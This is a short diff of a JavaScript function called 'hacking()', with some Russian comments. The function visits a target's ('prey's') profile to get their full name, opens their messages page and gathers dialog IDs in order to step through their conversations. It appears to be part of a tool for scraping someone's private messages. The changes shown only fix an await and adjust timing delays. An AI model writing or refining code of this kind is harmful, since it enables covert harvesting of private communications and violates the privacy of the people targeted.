@@ -334,13 +334,13 @@ async function hacking() {
     // ===== GET PREY's FULLNAME ===== //
     toProfile(); // go to profile
     await wait(3500); // wait some time
-    let preyName = getPreyFullName(); // get full name
+    let preyName = await getPreyFullName(); // get full name
     // ===== GET PREY's FULLNAME ===== //
 
 
     // ===== GO TO MESSAGES Page ===== //
     toMessages();
-    await wait(2000); // wait some time
+    await wait(3000); // wait some time
     // ===== GO TO MESSAGES Page ===== //
 
 
@@ -349,7 +349,6 @@ async function hacking() {
         [preyName]: {}
     }
     // инициализируем объект с полученными данными
-
 
     let dialogsIds = getDialogsIDs(); // получаем id диалогов, чтобы можно было по ним пройтись циклом
     let dialogsCount = dialogsIds.length; // кол-во диалогов
